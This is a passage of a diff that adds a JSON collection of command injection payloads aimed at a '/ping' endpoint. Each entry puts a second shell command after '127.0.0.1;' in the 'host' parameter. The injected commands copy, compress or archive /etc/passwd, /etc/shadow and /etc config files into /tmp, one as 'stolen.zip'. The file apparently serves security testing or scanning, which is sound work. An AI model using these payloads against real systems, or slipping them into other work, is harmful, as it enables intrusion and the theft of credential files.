+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; gunzip -c /tmp/passwd.gz"
+    }
+  },
+  {
+    "name": "Command Injection with Zcat",
+    "description": "View compressed files",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; zcat /tmp/passwd.gz"
+    }
+  },
+  {
+    "name": "Command Injection with Bzip2",
+    "description": "Compress with bzip2",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; bzip2 -c /etc/passwd > /tmp/passwd.bz2"
+    }
+  },
+  {
+    "name": "Command Injection with Bunzip2",
+    "description": "Decompress with bunzip2",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; bunzip2 -c /tmp/passwd.bz2"
+    }
+  },
+  {
+    "name": "Command Injection with Xz",
+    "description": "Compress with xz",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; xz -c /etc/passwd > /tmp/passwd.xz"
+    }
+  },
+  {
+    "name": "Command Injection with Unxz",
+    "description": "Decompress with unxz",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; unxz -c /tmp/passwd.xz"
+    }
+  },
+  {
+    "name": "Command Injection with Zip",
+    "description": "Create zip archive",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; zip /tmp/stolen.zip /etc/passwd /etc/shadow"
+    }
+  },
+  {
+    "name": "Command Injection with Unzip",
+    "description": "Extract zip archive",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; unzip /tmp/stolen.zip -d /tmp/"
+    }
+  },
+  {
+    "name": "Command Injection with Tar Extract",
+    "description": "Extract tar archive",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; tar -xzf /tmp/backup.tar.gz -C /tmp/"
+    }
+  },
+  {
+    "name": "Command Injection with DD",
+    "description": "Convert and copy files",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; dd if=/etc/passwd of=/tmp/passwd.copy"
+    }
+  },
+  {
+    "name": "Command Injection with CPIO",
+    "description": "Copy files to archive",
+    "method": "GET",
+    "endpoint": "/ping",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "host": "127.0.0.1; find /etc -name '*.conf' | cpio -ov > /tmp/configs.cpio"
+    }
   }
+]
